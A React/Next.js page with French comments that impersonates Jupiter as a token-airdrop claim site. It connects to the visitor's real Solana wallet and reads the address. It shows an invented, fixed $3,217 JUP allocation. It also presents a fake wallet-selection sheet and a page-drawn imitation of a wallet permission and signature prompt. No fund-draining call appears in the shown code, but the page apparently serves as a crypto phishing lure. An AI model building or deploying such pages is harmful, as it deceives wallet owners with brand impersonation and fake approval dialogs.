import Head from 'next/head'
import { useEffect, useState } from 'react'

/*
 * Ecran atteint apres la transition : une carte de reclamation. C'est une
 * piece d'UI, donc entierement en code. Le seul visuel importe est le logo
 * Jupiter. Un reflet balaie le panneau Your allocation et le bouton Connect
 * Wallet. L'allocation se revele par un defilement de chiffres, puis affiche
 * le montant en dollars. Connect Wallet ouvre Jupiter Mobile.
 */

const DOLLARS = 3217      // montant fixe en dollars
const ADRESSE_REPLI = '7yg1...fLRb' // affiche si aucun wallet injecte n'est present

const abrege = (a) => (a && a.length > 12 ? `${a.slice(0, 4)}...${a.slice(-4)}` : a)

// Lit l'adresse du wallet reellement connecte dans le navigateur (Jupiter,
// Phantom, Backpack...). Renvoie null si aucun wallet n'est disponible.
async function lireAdresseWallet() {
  if (typeof window === 'undefined') return null
  const fournisseurs = [window.jupiter?.solana, window.jupiter, window.solana, window.backpack?.solana].filter(Boolean)
  for (const p of fournisseurs) {
    if (typeof p.connect !== 'function') continue
    try {
      const res = await p.connect().catch(() => p.connect({ onlyIfTrusted: true }))
      const pk = res?.publicKey || p.publicKey || res?.accounts?.[0]?.address
      const s = typeof pk === 'string' ? pk : pk?.toString?.()
      if (s) return s
    } catch { /* refuse ou indisponible : on essaie le suivant */ }
  }
  return null
}
const JUP_MINT = 'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN'
const PRIX_JUP = 'https://lite-api.jup.ag/price/v3?ids=' + JUP_MINT
const PRIX_REPLI = 0.2936 // secours si l'API ne repond pas
const OUVRIR_DANS_JUPITER = (url) => `jupiter://browse/${encodeURIComponent(url)}`
const INSTALLER_JUPITER = 'https://jup.ag/mobile'

const format = (n) => Math.round(n).toLocaleString('en-US')

export default function Connect() {
  const [jup, setJup] = useState(0)
  const [revele, setRevele] = useState(false)
  // Allocation en JUP = montant en dollars / prix live du JUP
  const [cible, setCible] = useState(null)
  // Tant que le wallet n'est pas connecte, on ne montre que les carres vides
  const [connecte, setConnecte] = useState(false)
  // Modale de choix du wallet (feuille qui monte du bas)
  const [feuille, setFeuille] = useState(false)
  // Modale de signature affichee au Claim
  const [signature, setSignature] = useState(false)
  // Adresse du wallet connecte (repli tant qu'aucun wallet n'a repondu)
  const [adresse, setAdresse] = useState(ADRESSE_REPLI)
  const [reclame, setReclame] = useState(false)
  const [hote, setHote] = useState('')
  useEffect(() => setHote(window.location.hostname), [])

  // Recuperer le prix live du JUP des l'arrivee, avec repli si l'API echoue
  useEffect(() => {
    let fait = false
    const poser = (prix) => {
      if (fait || !(prix > 0)) return
      fait = true
      setCible(Math.round(DOLLARS / prix))
    }
    const secours = setTimeout(() => poser(PRIX_REPLI), 1400)
    fetch(PRIX_JUP)
      .then((r) => r.json())
      .then((d) => {
        const prix = parseFloat(d?.[JUP_MINT]?.usdPrice)
        if (prix > 0) { clearTimeout(secours); poser(prix) }
      })
      .catch(() => {})
    return () => clearTimeout(secours)
  }, [])

  // Une fois connecte, defilement des chiffres jusqu'a l'allocation
  useEffect(() => {
    if (!connecte || cible == null) return
    const debut = performance.now()
    const duree = 1700
    let raf
    const tick = (t) => {
      const p = Math.min((t - debut) / duree, 1)
      const e = 1 - Math.pow(1 - p, 3)
      setJup(cible * e)
      if (p < 1) raf = requestAnimationFrame(tick)
      else { setJup(cible); setRevele(true) }
    }
    raf = requestAnimationFrame(tick)
    return () => cancelAnimationFrame(raf)
  }, [connecte, cible])

  // Connect Wallet : ouvre la liste des wallets
  const ouvrirFeuille = () => setFeuille(true)
  // Choix de Jupiter : on lie le wallet (sans quitter le site), on ferme la
  // feuille, puis on revele l'allocation
  const choisirJupiter = async () => {
    const a = await lireAdresseWallet()
    if (a) setAdresse(abrege(a))
    setFeuille(false)
    setConnecte(true)
  }
  // Claim : ouvre l'ecran de signature
  const reclamer = () => setSignature(true)
  // Confirmation de la signature : l'allocation est reclamee
  const confirmer = () => {
    setSignature(false)
    setReclame(true)
  }

  return (
    <>
      <Head>
        <title>Check your allocation - Jupiter</title>
        <meta name="description" content="Connect your wallet to check your JUP allocation." />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link href="https://fonts.googleapis.com/css2?family=Inter+Tight:wght@400;500;600;700;800&display=block" rel="stylesheet" />
      </Head>

      <style jsx global>{`
        html, body { margin: 0; padding: 0; }
        * { box-sizing: border-box; }
        body {
          min-height: 100vh; min-height: 100dvh;
          background:
            radial-gradient(120% 90% at 50% 34%, #12203f 0%, #0a1326 42%, #050a16 74%, #03060e 100%);
          font-family: 'Inter Tight', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          display: flex; align-items: center; justify-content: center;
          padding: 28px 34px;
        }
        .carte {
          position: relative; width: 100%; max-width: 420px;
          background: linear-gradient(180deg, rgba(28,42,72,0.55), rgba(14,22,40,0.6));
          border: 1px solid rgba(120,150,200,0.18);
          border-radius: 28px; padding: 26px 24px 22px;
          box-shadow: 0 0 60px rgba(60,110,240,0.18), inset 0 1px 0 rgba(255,255,255,0.04);
          color: #fff;
        }
        .tete { display: flex; align-items: center; gap: 14px; }
        .app-ic {
          width: 54px; height: 54px; border-radius: 15px; background: #05070c;
          display: flex; align-items: center; justify-content: center; flex: 0 0 auto;
          box-shadow: inset 0 0 0 1px rgba(255,255,255,0.05);
        }
        .app-ic img { width: 40px; height: 40px; }
        .titre { font-size: 26px; font-weight: 700; line-height: 1.1; letter-spacing: -0.01em; }
        .sous-titre { font-size: 16px; color: #8b98ab; margin-top: 3px; }
        .badge {
          display: inline-flex; align-items: center; gap: 9px; margin-top: 18px;
          padding: 8px 15px; border-radius: 999px;
          border: 1px solid rgba(52,211,153,0.4); color: #34d399;
          font-size: 15px; font-weight: 700;
        }
        .badge .point { width: 9px; height: 9px; border-radius: 50%; background: #34d399; box-shadow: 0 0 8px #34d399; }

        .panneau {
          position: relative; overflow: hidden;
          margin-top: 18px; padding: 20px; border-radius: 18px;
          background: rgba(10,16,30,0.45); border: 1px solid rgba(120,150,200,0.14);
        }
        .p-label { font-size: 13px; font-weight: 700; letter-spacing: 0.12em; color: #808ea3; }
        .p-ligne { display: flex; align-items: center; gap: 10px; margin-top: 16px; }
        .case { flex: 1 1 0; min-width: 0; max-width: 44px; aspect-ratio: 1 / 1; border-radius: 11px; background: #171f30; }
        .p-jup { display: flex; align-items: center; gap: 10px; margin-left: 4px; flex: 0 0 auto; }
        .p-jup img { width: 30px; height: 30px; }
        .p-jup span { font-size: 27px; font-weight: 700; color: #5f83e8; }
        .p-note { font-size: 16px; color: #8b98ab; margin-top: 16px; }
        .p-montant { display: flex; align-items: baseline; gap: 9px; margin-top: 14px; flex-wrap: nowrap; }
        .p-montant img { width: 30px; height: 30px; align-self: center; flex: 0 0 auto; }
        .p-nb {
          font-size: 34px; font-weight: 800; color: #fff; letter-spacing: -0.02em;
          font-variant-numeric: tabular-nums; font-feature-settings: "tnum"; white-space: nowrap;
        }
        .p-unite { font-size: 21px; font-weight: 700; color: #5f83e8; flex: 0 0 auto; }
        .p-usd {
          font-size: 19px; font-weight: 600; color: #34d399; margin-top: 10px;
          opacity: 0; transform: translateY(4px); transition: opacity .4s ease, transform .4s ease;
        }
        .p-usd-on { opacity: 1; transform: translateY(0); }

        .rang { display: flex; align-items: center; justify-content: space-between; padding: 16px 2px; }
        .rang + .rang { border-top: 1px solid rgba(120,150,200,0.12); }
        .rang-cle { font-size: 17px; color: #8b98ab; }
        .rang-val { font-size: 17px; font-weight: 700; display: flex; align-items: center; gap: 9px; }
        .rang-val img { width: 24px; height: 24px; }

        .cw {
          position: relative; overflow: hidden;
          width: 100%; margin-top: 8px; padding: 18px; border: 0; border-radius: 15px;
          background: linear-gradient(180deg, #4f83f7, #3b6ef0);
          color: #fff; font-size: 19px; font-weight: 700; font-family: inherit; cursor: pointer;
          box-shadow: 0 10px 26px rgba(59,110,240,0.4);
        }
        .pied { display: flex; align-items: center; justify-content: center; gap: 9px; margin-top: 16px; color: #8b98ab; font-size: 15px; }
        .pied svg { width: 16px; height: 16px; }

        /* reflet qui balaie */
        .brille::after {
          content: ""; position: absolute; top: 0; left: 0; height: 100%; width: 45%;
          background: linear-gradient(100deg, transparent, rgba(255,255,255,0.14), transparent);
          transform: translateX(-160%); pointer-events: none;
          animation: balaye 3.2s ease-in-out infinite;
        }
        .cw.brille::after { background: linear-gradient(100deg, transparent, rgba(255,255,255,0.4), transparent); animation-duration: 2.8s; animation-delay: 0.6s; }
        @keyframes balaye {
          0% { transform: translateX(-160%); }
          55% { transform: translateX(320%); }
          100% { transform: translateX(320%); }
        }
        @media (prefers-reduced-motion: reduce) { .brille::after { display: none; } }
        .cw-ok { background: #1e3a24; color: #7ee6a0; box-shadow: none; cursor: default; }

        /* ---- Feuilles (modales qui montent du bas) ---- */
        .feuille-fond {
          position: fixed; inset: 0; z-index: 40;
          display: flex; align-items: flex-end; justify-content: center;
          background: rgba(0, 0, 0, 0.55);
          animation: f-fondu 0.2s ease-out;
        }
        .feuille {
          width: 100%; max-width: 460px;
          background: #17181c; color: #fff;
          border-radius: 26px 26px 0 0;
          padding: 18px 18px calc(22px + env(safe-area-inset-bottom));
          box-shadow: 0 -12px 40px rgba(0, 0, 0, 0.5);
          animation: f-monte 0.28s cubic-bezier(.2, .8, .2, 1);
        }
        @keyframes f-fondu { from { opacity: 0; } to { opacity: 1; } }
        @keyframes f-monte { from { transform: translateY(100%); } to { transform: translateY(0); } }

        .f-tete { display: flex; align-items: center; justify-content: space-between; padding: 6px 4px 14px; }
        .f-titre { font-size: 20px; font-weight: 600; }
        .f-rond {
          width: 34px; height: 34px; border-radius: 50%; background: #24262c;
          display: flex; align-items: center; justify-content: center;
          color: #cfd6df; font-size: 18px; border: 0; flex: 0 0 auto;
        }
        .f-x { cursor: pointer; font-size: 22px; line-height: 1; }

        .wrow {
          display: flex; align-items: center; gap: 15px; width: 100%;
          background: none; border: 0; color: #fff; font-family: inherit;
          padding: 13px 6px; cursor: pointer; text-align: left;
        }
        .wrow:active { background: #202228; border-radius: 14px; }
        .wrow img, .wloupe { width: 46px; height: 46px; border-radius: 13px; flex: 0 0 auto; }
        .wloupe { background: #24262c; display: flex; align-items: center; justify-content: center; }
        .wloupe svg { width: 22px; height: 22px; }
        .wnom { flex: 1 1 auto; font-size: 20px; font-weight: 500; }
        .wchev { color: #6b7482; font-size: 26px; flex: 0 0 auto; }
        .winstall {
          font-size: 13px; font-weight: 700; letter-spacing: 0.03em; color: #4ade80;
          background: rgba(52, 211, 153, 0.14); border-radius: 8px; padding: 5px 10px; flex: 0 0 auto;
        }
        .wsearch { background: #1d1f24; border-radius: 15px; margin-top: 8px; padding: 13px 12px; }
        .wcompte { font-size: 14px; color: #9aa4b2; background: #2a2d34; border-radius: 8px; padding: 4px 9px; flex: 0 0 auto; }
        .f-pied { text-align: center; color: #6b7482; font-size: 15px; margin-top: 18px; }
        .f-pied .reown { color: #cfd6df; background: #24262c; border-radius: 999px; padding: 4px 12px; margin-left: 4px; }

        /* ---- Signature ---- */
        .sig { position: relative; padding-top: 26px; }
        .sig-poignee { position: absolute; top: 12px; left: 50%; transform: translateX(-50%); width: 40px; height: 5px; border-radius: 3px; background: #4a4d55; }
        .sig-x { position: absolute; top: 20px; right: 20px; background: none; border: 0; color: #fff; font-size: 24px; cursor: pointer; line-height: 1; }
        .sig-hote { display: flex; align-items: center; justify-content: center; gap: 8px; color: #aab3bf; font-size: 17px; margin: 8px 0 20px; }
        .sig-hote svg { width: 18px; height: 18px; }
        .sig-titre { color: #a3e635; font-size: 22px; font-weight: 700; margin: 0 2px 14px; }
        .sig-panneau { background: #202228; border-radius: 16px; padding: 6px 4px; }
        .sig-item { display: flex; align-items: center; gap: 12px; padding: 12px 14px; font-size: 17px; color: #eef2f6; }
        .sig-oui { color: #a3e635; font-size: 17px; flex: 0 0 auto; }
        .sig-non { color: #cfd6df; font-size: 17px; flex: 0 0 auto; }
        .sig-compte { display: flex; align-items: center; justify-content: space-between; padding: 16px 14px 12px; margin-top: 4px; border-top: 1px solid #2e3138; font-size: 17px; }
        .sig-adr { color: #8b98ab; }
        .sig-actions { display: flex; gap: 14px; margin-top: 18px; }
        .sig-btn { flex: 1 1 0; padding: 17px; border: 0; border-radius: 999px; font-family: inherit; font-size: 18px; font-weight: 700; cursor: pointer; }
        .sig-cancel { background: #26361c; color: #a3e635; }
        .sig-confirm { background: #bff56b; color: #0a1a05; }
        .sig-note { text-align: center; color: #6b7482; font-size: 15px; margin-top: 16px; }
      `}</style>

      <div className="carte">
        <div className="tete">
          <div className="app-ic"><img src="/assets/jupiter-logo.png" alt="" /></div>
          <div>
            <div className="titre">Jupiter</div>
            <div className="sous-titre">Check your allocation</div>
          </div>
        </div>

        <div className="badge"><span className="point" />Window open</div>

        <div className="panneau brille">
          <div className="p-label">YOUR ALLOCATION</div>
          {connecte ? (
            <>
              <div className="p-montant">
                <img src="/assets/jupiter-logo.png" alt="" />
                <span className="p-nb">{format(jup)}</span>
                <span className="p-unite">JUP</span>
              </div>
              <div className={`p-usd ${revele ? 'p-usd-on' : ''}`}>&asymp; ${format(DOLLARS)}</div>
            </>
          ) : (
            <>
              <div className="p-ligne">
                <span className="case" /><span className="case" /><span className="case" /><span className="case" />
                <span className="p-jup"><img src="/assets/jupiter-logo.png" alt="" /><span>JUP</span></span>
              </div>
              <div className="p-note">Shown after an eligible wallet connects.</div>
            </>
          )}
        </div>

        <div className="rang">
          <span className="rang-cle">Wallet</span>
          <span className="rang-val">{connecte ? <><img src="/assets/wallet-jupiter.png" alt="" />{adresse}</> : 'Not connected'}</span>
        </div>
        <div className="rang">
          <span className="rang-cle">Settles in</span>
          <span className="rang-val"><img src="/assets/jupiter-logo.png" alt="" />JUP on Solana</span>
        </div>

        {reclame ? (
          <button className="cw cw-ok" disabled>Claimed &#10003;</button>
        ) : connecte ? (
          <button className="cw brille" onClick={reclamer}>Claim</button>
        ) : (
          <button className="cw brille" onClick={ouvrirFeuille}>Connect Wallet</button>
        )}

        <div className="pied">
          <svg viewBox="0 0 24 24" fill="none" stroke="#8b98ab" strokeWidth="2"><path d="M12 3l7 3v5c0 4-3 7-7 8-4-1-7-4-7-8V6z" strokeLinejoin="round" /></svg>
          Secure on-chain signature
        </div>
      </div>

      {/* --- Feuille : choix du wallet --- */}
      {feuille && (
        <div className="feuille-fond" onClick={() => setFeuille(false)}>
          <div className="feuille" onClick={(e) => e.stopPropagation()} role="dialog" aria-modal="true">
            <div className="f-tete">
              <span className="f-rond">?</span>
              <span className="f-titre">Connect Wallet</span>
              <button className="f-rond f-x" onClick={() => setFeuille(false)} aria-label="Close">&times;</button>
            </div>
            <button className="wrow" onClick={choisirJupiter}>
              <img src="/assets/wallet-jupiter.png" alt="" />
              <span className="wnom">Jupiter</span>
              <span className="winstall">INSTALLED</span>
              <span className="wchev">&rsaquo;</span>
            </button>
            <button className="wrow" onClick={choisirJupiter}>
              <img src="/assets/wallet-backpack.png" alt="" />
              <span className="wnom">Backpack</span>
              <span className="wchev">&rsaquo;</span>
            </button>
            <button className="wrow" onClick={choisirJupiter}>
              <img src="/assets/wallet-mywallet.png" alt="" />
              <span className="wnom">My Wallet</span>
              <span className="wchev">&rsaquo;</span>
            </button>
            <button className="wrow wsearch" onClick={choisirJupiter}>
              <span className="wloupe">
                <svg viewBox="0 0 24 24" fill="none" stroke="#9aa4b2" strokeWidth="2"><circle cx="11" cy="11" r="7" /><path d="M20 20l-3.2-3.2" strokeLinecap="round" /></svg>
              </span>
              <span className="wnom">Search Wallet</span>
              <span className="wcompte">150+</span>
              <span className="wchev">&rsaquo;</span>
            </button>
            <div className="f-pied">UX by <span className="reown">reown</span></div>
          </div>
        </div>
      )}

      {/* --- Feuille : autorisation / signature du claim --- */}
      {signature && (
        <div className="feuille-fond" onClick={() => setSignature(false)}>
          <div className="feuille sig" onClick={(e) => e.stopPropagation()} role="dialog" aria-modal="true">
            <span className="sig-poignee" />
            <button className="sig-x" onClick={() => setSignature(false)} aria-label="Close">&times;</button>
            <div className="sig-hote">
              <svg viewBox="0 0 24 24" fill="none" stroke="#9aa4b2" strokeWidth="2"><path d="M9 15l6-6M8 12l-2 2a3 3 0 104 4l2-2M16 12l2-2a3 3 0 10-4-4l-2 2" strokeLinecap="round" strokeLinejoin="round" /></svg>
              {hote}
            </div>
            <div className="sig-titre">This app would like to:</div>
            <div className="sig-panneau">
              <div className="sig-item"><span className="sig-oui">&#10003;</span>Can view activity and account balance</div>
              <div className="sig-item"><span className="sig-oui">&#10003;</span>Can request approval for transactions</div>
              <div className="sig-item"><span className="sig-non">&times;</span>Can&rsquo;t access funds without your permission</div>
              <div className="sig-compte"><span>Account</span><span className="sig-adr">{adresse}</span></div>
            </div>
            <div className="sig-actions">
              <button className="sig-btn sig-cancel" onClick={() => setSignature(false)}>Cancel</button>
              <button className="sig-btn sig-confirm" onClick={confirmer}>Confirm</button>
            </div>
            <div className="sig-note">Only confirm if you trust this website</div>
          </div>
        </div>
      )}
    </>
  )
}
